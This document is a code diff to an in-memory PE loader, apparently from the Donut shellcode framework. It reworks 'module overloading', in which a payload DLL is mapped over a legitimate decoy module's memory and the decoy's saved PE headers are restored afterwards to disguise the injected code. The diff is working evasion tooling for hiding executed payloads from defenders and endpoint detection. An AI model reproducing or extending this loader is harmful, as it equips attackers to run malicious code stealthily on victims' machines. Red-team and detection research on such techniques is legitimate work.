@@ -55,7 +55,7 @@ BOOL IsExitAPI(PDONUT_INSTANCE inst, PCHAR name);
 // In-Memory execution of unmanaged DLL file. YMMV with EXE files requiring subsystem..
 VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     PIMAGE_DOS_HEADER           dos, doshost;
-    PIMAGE_NT_HEADERS           nt, nthost;
+    PIMAGE_NT_HEADERS           nt, nthost, ntnew, origmod;
     PIMAGE_SECTION_HEADER       sh;
     PIMAGE_SECTION_HEADER       shcp = NULL;
     PIMAGE_THUNK_DATA           oft, ft;
@@ -183,7 +183,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     status = inst->api.NtMapViewOfSection(hSection, inst->api.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
     DPRINT("View size: %lld", viewSize);
 
-    PIMAGE_NT_HEADERS ntnew   = RVA2VA(PIMAGE_NT_HEADERS, cs, dos->e_lfanew);
+    ntnew = RVA2VA(PIMAGE_NT_HEADERS, cs, dos->e_lfanew);
 
     DPRINT("NTSTATUS: %d", status);
     if(status != 0 && status != 0x40000003) return;
@@ -191,10 +191,22 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     DPRINT("Mapped to address: %p", cs);
     
     if(cs == NULL) return;
-
-    // if module overloading, set everything to RW because they will start out otherwise
+    
     if (inst->decoy[0] != 0) 
+    {
+      // if module overloading, set everything to RW because they will start out otherwise
       inst->api.VirtualProtect(cs, viewSize, PAGE_READWRITE, &oldprot);
+
+      DPRINT("Making copy of decoy module's headers for later use.");
+
+      origmod = inst->api.VirtualAlloc(NULL, nt->OptionalHeader.SizeOfHeaders, 
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+      Memcpy(origmod, cs, nt->OptionalHeader.SizeOfHeaders);
+
+      DPRINT("Wiping section view before mapping to it.");
+      Memset(cs, 0, viewSize);
+    }
 
     DPRINT("Copying Headers");
     DPRINT("nt->FileHeader.SizeOfOptionalHeader: %d", nt->FileHeader.SizeOfOptionalHeader);
@@ -214,7 +226,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     DPRINT("Copying each section to memory: %p", cs);
     sh = IMAGE_FIRST_SECTION(ntnew);
       
-    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
+    for(i=0; i<ntnew->FileHeader.NumberOfSections; i++) {
       PBYTE dest = (PBYTE)cs + sh[i].VirtualAddress;
       PBYTE source = (PBYTE)base + sh[i].PointerToRawData;
 
@@ -239,11 +251,12 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     DPRINT("Sections copied.");
 
     ofs  = (PBYTE)cs - nt->OptionalHeader.ImageBase;
+    DPRINT("Image Relocation Offset: 0x%p", ofs);
 
     if (has_reloc && ofs != 0) {
       DPRINT("Applying Relocations");
       
-      rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+      rva  = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
       ibr = RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);
       
       while ((PBYTE)ibr < ((PBYTE)cs + rva + size) && ibr->SizeOfBlock != 0) {
@@ -251,7 +264,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
   
         while ((PBYTE)list != (PBYTE)ibr + ibr->SizeOfBlock) {
           // check that the RVA is within the boundaries of the PE
-          if (ibr->VirtualAddress + list->offset < nt->OptionalHeader.SizeOfImage) {
+          if (ibr->VirtualAddress + list->offset < ntnew->OptionalHeader.SizeOfImage) {
             PULONG_PTR address = (PULONG_PTR)((PBYTE)cs + ibr->VirtualAddress + list->offset);
             if (list->type == IMAGE_REL_BASED_DIR64) {
               *address += (ULONG_PTR)ofs;
@@ -272,7 +285,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       }
     }
     
-    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+    rva = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
     
     if(rva != 0) {
       DPRINT("Processing the Import Table");
@@ -316,7 +329,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       }
     }
     
-    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;
+    rva = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;
     
     if(rva != 0) {
       DPRINT("Processing Delayed Import Table");
@@ -352,8 +365,8 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       }
     }
       
-    size_of_img = nt->OptionalHeader.SizeOfImage;
-    Start = RVA2VA(Start_t, cs, nt->OptionalHeader.AddressOfEntryPoint);
+    size_of_img = ntnew->OptionalHeader.SizeOfImage;
+    Start = RVA2VA(Start_t, cs, ntnew->OptionalHeader.AddressOfEntryPoint);
 
     // copy relevant headers before they are wiped
     ntc = *nt;
@@ -374,7 +387,11 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       }
       else {
         DPRINT("Overwriting PE headers with the decoy module's.");
-        Memcpy(base, cs, nt->OptionalHeader.SizeOfHeaders);
+
+        if (origmod != NULL)
+          Memcpy(cs, origmod, nt->OptionalHeader.SizeOfHeaders);
+        else
+          DPRINT("Could not locate decoy PE headers.");
       }
     }
 
@@ -393,6 +410,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
 
       DPRINT("Mapping writecopy local view of section to execute PE.");
       status = inst->api.NtMapViewOfSection(hSection, inst->api.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);
+      DPRINT("View size: %lld", viewSize);
       DPRINT("NTSTATUS: %d", status);
       if(status != 0) return;
 
@@ -457,7 +475,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       Execute TLS callbacks. These are only called when the process starts, not when a thread begins, ends
       or when the process ends. TLS is not fully supported.
     */
-    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
+    rva = ntnew->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
     if(rva != 0) {
       DPRINT("Processing TLS directory");
       
@@ -579,6 +597,10 @@ pe_cleanup:
       DPRINT("Releasing memory");
 
       inst->api.VirtualFree(shcp, ntc.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER), MEM_RELEASE | MEM_DECOMMIT);
+
+      if (origmod != NULL)
+        inst->api.VirtualFree(origmod, ntc.OptionalHeader.SizeOfHeaders, MEM_RELEASE | MEM_DECOMMIT);
+      
       inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
       inst->api.CloseHandle(hSection);
     }
